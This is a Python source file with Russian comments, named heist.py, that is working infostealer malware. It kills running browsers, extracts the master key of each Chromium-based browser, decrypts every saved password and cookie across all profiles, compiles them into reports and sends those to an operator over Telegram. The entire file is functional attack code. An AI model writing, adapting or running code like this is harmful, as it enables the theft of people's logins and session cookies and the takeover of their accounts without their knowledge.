# Файл: heist.py
import os
import json
import base64
import sqlite3
import shutil
import time
from datetime import datetime
import psutil

# Пробуем импортировать всё необходимое для шифрования.
try:
    from Crypto.Cipher import AES
    import win32crypt
except ImportError:
    AES, win32crypt = None, None

# Импортируем наши утилиты
from utils import send_status_to_operator, send_telegram_document, TEMP_PATH

def find_chromium_paths():
    """Находит пути ко всем Chromium-браузерам, включая нестандартные."""
    # Жёстко прописываем известные пути для максимальной надёжности
    paths = {
        'Google Chrome': os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        'Microsoft Edge': os.path.join(os.getenv('LOCALAPPDATA'), 'Microsoft', 'Edge', 'User Data'),
        'Opera Stable': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera Stable'),
        'Opera GX': os.path.join(os.getenv('APPDATA'), 'Opera Software', 'Opera GX Stable'),
        'Brave': os.path.join(os.getenv('LOCALAPPDATA'), 'BraveSoftware', 'Brave-Browser', 'User Data'),
        'Vivaldi': os.path.join(os.getenv('LOCALAPPDATA'), 'Vivaldi', 'User Data'),
        'Yandex Browser': os.path.join(os.getenv('LOCALAPPDATA'), 'Yandex', 'YandexBrowser', 'User Data'),
    }
    return {name: path for name, path in paths.items() if os.path.exists(path)}

def get_master_key(browser_path):
    """Извлекает мастер-ключ, безопасно проверяя структуру JSON."""
    local_state_path = os.path.join(browser_path, 'Local State')
    if not os.path.exists(local_state_path): return None
    try:
        with open(local_state_path, 'r', encoding='utf-8', errors='ignore') as f:
            local_state = json.load(f)
        if 'os_crypt' not in local_state or 'encrypted_key' not in local_state['os_crypt']:
            return None
        encrypted_key = base64.b64decode(local_state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
    except Exception:
        return None

def decrypt_value(encrypted_value, master_key):
    """Расшифровывает данные, используя AES GCM или DPAPI."""
    if not encrypted_value or not master_key: return "N/A (нет данных)"
    try:
        if encrypted_value.startswith(b'v10') or encrypted_value.startswith(b'v11'):
            iv, payload = encrypted_value[3:15], encrypted_value[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_val = cipher.decrypt(payload)
            return decrypted_val[:-16].decode(errors='ignore')
        else:
            return win32crypt.CryptUnprotectData(encrypted_value, None, None, None, 0)[1].decode(errors='ignore')
    except Exception:
        return "N/A (ошибка расшифровки)"

# --- НОВЫЙ, ПУЛЕНЕПРОБИВАЕМЫЙ ИЗВЛЕКАТЕЛЬ ДАННЫХ ---
def extract_data_from_db(db_path, query, processor_func, master_key):
    """Надёжно извлекает и обрабатывает данные из любой SQLite базы."""
    results = []
    if not os.path.exists(db_path): return results

    # Уникальное имя для временного файла, чтобы избежать конфликтов
    temp_db = os.path.join(TEMP_PATH, f'temp_{os.path.basename(db_path)}_{os.urandom(4).hex()}.db')
    try:
        shutil.copy2(db_path, temp_db)
    except (IOError, shutil.SameFileError) as e:
        print(f"[!] Не удалось скопировать {os.path.basename(db_path)}: {e}")
        return results

    conn = None
    try:
        conn = sqlite3.connect(temp_db)
        conn.text_factory = bytes # Читаем всё как байты, чтобы избежать ошибок декодирования
        cursor = conn.cursor()
        cursor.execute(query)
        for row in cursor.fetchall():
            results.extend(processor_func(row, master_key))
    except Exception as e: print(f"[!]Ошибка чтения из {os.path.basename(temp_db)}: {e}")
    finally:
        if conn: conn.close()
        time.sleep(0.1) # Даем ОС время одуматься
        if os.path.exists(temp_db): os.remove(temp_db)
    return results

# Обработчики для разных типов данных, теперь работают с байтами
def process_password(row, master_key):
    url, username, pwd_value = row[0].decode(errors='ignore'), row[1].decode(errors='ignore'), row[2]
    if username and pwd_value:
        return [f"URL: {url}\n  Логин: {username}\n  Пароль: {decrypt_value(pwd_value, master_key)}\n"]
    return []

def process_cookie(row, master_key):
    host, name, enc_value = row[0].decode(errors='ignore'), row[1].decode(errors='ignore'), row[2]
    if enc_value:
        # Убрано сокращение куки
        return [f"Сайт: {host}\n  Имя: {name}\n  Куки: {decrypt_value(enc_value, master_key)}\n"]
    return []

def kill_browsers():
    """Убивает все известные процессы браузеров, включая Яндекс."""
    browser_processes = ["chrome.exe", "msedge.exe", "opera.exe", "brave.exe", "vivaldi.exe", "browser.exe"]
    for proc in psutil.process_iter(['name']):
        if proc.info['name'].lower() in browser_processes:
            try: proc.kill()
            except (psutil.NoSuchProcess, psutil.AccessDenied): pass

def start_heist(ws, loop):
    send_status_to_operator(ws, loop, "🔥 Начинаю HEIST...")
    if AES is None or win32crypt is None:
        send_status_to_operator(ws, loop, "❌ ПРОВАЛ: Отсутствуют библиотеки (pycryptodomex, pywin32).")
        return

    credentials_report, cookies_report = [f"🔑 Отчет по учетным данным от {datetime.now():%Y-%m-%d %H:%M:%S} 🔑\n"], [f"🍪 Отчет по Cookies от {datetime.now():%Y-%m-%d %H:%M:%S} 🍪\n"]

    try:
        send_status_to_operator(ws, loop, "Завершаю процессы браузеров...")
        kill_browsers()

        send_status_to_operator(ws, loop, "Ищу цели...")
        browser_paths = find_chromium_paths()
        if not browser_paths:
            send_status_to_operator(ws, loop, "Ни один из целевых браузеров не найден.")
            return

        for browser, path in browser_paths.items():
            send_status_to_operator(ws, loop, f"Цель: {browser}. Извлекаю мастер-ключ...")
            master_key = get_master_key(path)
            if not master_key: continue

            # Ищем данные во ВСЕХ профилях браузера
            profiles = ['Default'] + [d for d in os.listdir(path) if d.startswith('Profile ')]
            for profile in profiles:
                profile_path = os.path.join(path, profile)
                if not os.path.isdir(profile_path): continue

                report_header = f"\n--- {browser.upper()} (Профиль: {profile}) ---\n"

                # Извлекаем пароли и карты
                passwords = extract_data_from_db(os.path.join(profile_path, 'Login Data'), "SELECT origin_url, username_value, password_value FROM logins", process_password, master_key)

                # Извлекаем куки
                cookies = extract_data_from_db(os.path.join(profile_path, 'Network', 'Cookies'), "SELECT host_key, name, encrypted_value FROM cookies", process_cookie, master_key)

                if passwords:
                    credentials_report.append(report_header)
                    credentials_report.append("\n[*] Пароли:\n"); credentials_report.extend(passwords)

                if cookies:
                    cookies_report.append(report_header)
                    cookies_report.extend(cookies)

        hostname = os.getlogin()
        credentials_file, cookies_file = os.path.join(TEMP_PATH, f"credentials_{hostname}.txt"), os.path.join(TEMP_PATH, f"cookies_{hostname}.txt")

        with open(credentials_file, "w", encoding="utf-8") as f: f.write("\n".join(credentials_report))
        with open(cookies_file, "w", encoding="utf-8") as f: f.write("\n".join(cookies_report))

        send_status_to_operator(ws, loop, "Отправляю отчеты в Telegram...")
        send_telegram_document(credentials_file, f"🔑 Учетные данные от {hostname}")
        send_telegram_document(cookies_file, f"🍪 Куки от {hostname}")
        send_status_to_operator(ws, loop, "✅ HEIST завершен. Два отчета отправлены.")

        os.remove(credentials_file); os.remove(cookies_file)

    except Exception as e:
        error_message = f"❌ КРИТИЧЕСКИЙ ПРОВАЛ HEIST: {e}"
        print(f"[!!!] {error_message}")
        send_status_to_operator(ws, loop, error_message)